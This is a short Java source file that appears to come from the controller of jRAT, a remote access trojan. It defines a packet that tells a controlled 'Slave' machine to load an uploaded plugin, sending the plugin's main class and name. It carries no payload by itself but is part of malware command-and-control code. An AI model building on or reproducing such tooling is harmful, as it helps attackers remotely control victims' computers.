package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;

public class Packet101UploadPlugin extends AbstractOutgoingPacket {
	
	private String mainClass;
	private String name;
	
	public Packet101UploadPlugin(String mainClass, String name) {
		this.mainClass = mainClass;
		this.name = name;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(mainClass);
		slave.writeLine(name);
	}

	@Override
	public short getPacketId() {
		return 101;
	}

}
